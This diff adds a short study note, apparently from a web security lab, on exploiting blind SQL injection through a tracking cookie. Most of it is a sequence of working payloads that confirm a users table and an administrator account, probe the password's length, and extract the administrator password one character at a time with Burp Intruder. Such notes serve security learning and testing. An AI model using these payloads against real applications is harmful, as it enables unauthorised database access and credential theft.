@@ -1,0 +1,31 @@
+Exploiting blind SQL injection by triggering conditional responses
+
+With blind SQL injection vulnerabilities, many techniques such as UNION attacks, 
+are not effective because they rely on being able to see the results of the injected 
+query within the application's responses. It is still possible to exploit 
+blind SQL injection to access unauthorized data, but different techniques must be used.
+
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+
+sql quary be like ->
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+
+
+
+depending on an injected condition. To see how this works
+…xyz' AND '1'='1
+…xyz' AND '1'='2
+
+
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a   ---> verifing the table name 
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a ---> verifing the administrator
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a  ---> gettiing the length of password
+
+
+uning burp indruder to get the password
+
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+
+TrackingId=xyz' AND (SELECT SUBSTRING(password,§2§,1) FROM users WHERE username='administrator')='§a§
